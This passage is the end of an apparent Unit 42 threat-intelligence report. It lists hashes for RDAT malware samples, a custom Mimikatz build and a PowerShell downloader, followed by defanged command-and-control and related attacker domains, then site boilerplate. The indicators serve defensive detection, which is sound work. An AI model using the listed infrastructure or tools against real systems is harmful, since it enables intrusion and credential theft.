<p><span style="font-family: 'courier new', courier, monospace;">e53cc5e62ba15e43877ca2fc1bee16061b4468545d5cc1515cb38000e22dd060</span> - Custom Mimikatz</p>
<p><span style="font-family: 'courier new', courier, monospace;">476b40796be68a5ee349677274e438aeda3817f99ba9832172d81a2c64b0d4ae</span> - Bitvise client</p>
<p><span style="font-family: 'courier new', courier, monospace;">78584dadde1489a5dca0e307318b3d2d49e39eb3987de52e288f9882527078d5</span> - PowerShell downloader</p>
<h4><a id="post-108014-_r4ozr3uaxxzw"></a>RDAT Samples</h4>
<p><span style="font-family: 'courier new', courier, monospace;">7395a3ada245df6c8ff1d66fcb54b96ae12961d5fd9b6a57c43a3e7ab83f3cc2</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">8f943bc5b20517fea08b2d0acc9afe8990703e9d4f7015b98489703ca51da7eb</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">8120849fbe85179a16882dd1a12a09fdd3ff97e30c3dfe52b43dd2ba7ed33c2a</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">bcdb63b3520e34992f292bf9a38498f49a9ca045b7b40caab5302c76ca10f035</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">f42c2b40574dc837b33c1012f7b6f41fcccc5ebf740a2b0af64e2c530418e9e0</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">fcabb86331cd5e2fa9edb53c4282dfcb16cc3d2cae85aabf1ee3c0c0007e508c</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">7b5042d3f0e9f077ef2b1a55b5fffab9f07cc856622bf79d56fc752e4dc04b28</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">ee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">de3f1cc2d4aac54fbdebd5bd05c9df59b938eb79bda427ae26dedef4309c55a9</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">4ea6da6b35c4cdc6043c3b93bd6b61ea225fd5e1ec072330cb746104d0b0a4ec</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">acb50b02ab0ca846025e7ad6c795a80dc6f61c4426704d0f1dd7e195143f5323</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">55282007716b2b987a84a790eb1c9867e23ed8b5b89ef1a836cbedaf32982358</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">ba380e589261781898b1a54c2889f3360db09c61b9155607d7b4d11fcd85bd9d</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">6322cacf839b9c863f09c8ad9fd0e091501c9ba354730ab4809bb4c076610006</span></p>
<h4><a id="post-108014-_vxtztetal34"></a>RDAT C2 Domains</h4>
<p><span style="font-family: 'courier new', courier, monospace;">rdmsi[.]com</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">rsshay[.]com</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">sharjatv[.]com</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">wwmal[.]com</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">allsecpackupdater[.]com</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">tacsent[.]com</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">acrlee[.]com </span></p>
<p><span style="font-family: 'courier new', courier, monospace;">kopilkaorukov[.]com</span></p>
<h4><a id="post-108014-_gr9gjt15gmaa"></a>Related Infrastructure</h4>
<p><span style="font-family: 'courier new', courier, monospace;">digi.shanx[.]icu</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">tprs-servers[.]eu</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">oudax[.]com</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">kizlarsoroyur[.]com</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">intelligent-finance[.]site</span></p>
<p>&nbsp;</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" name="emailFormMask" value="">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>


        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2021 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
    <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","enable_video_popuping":"enable","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
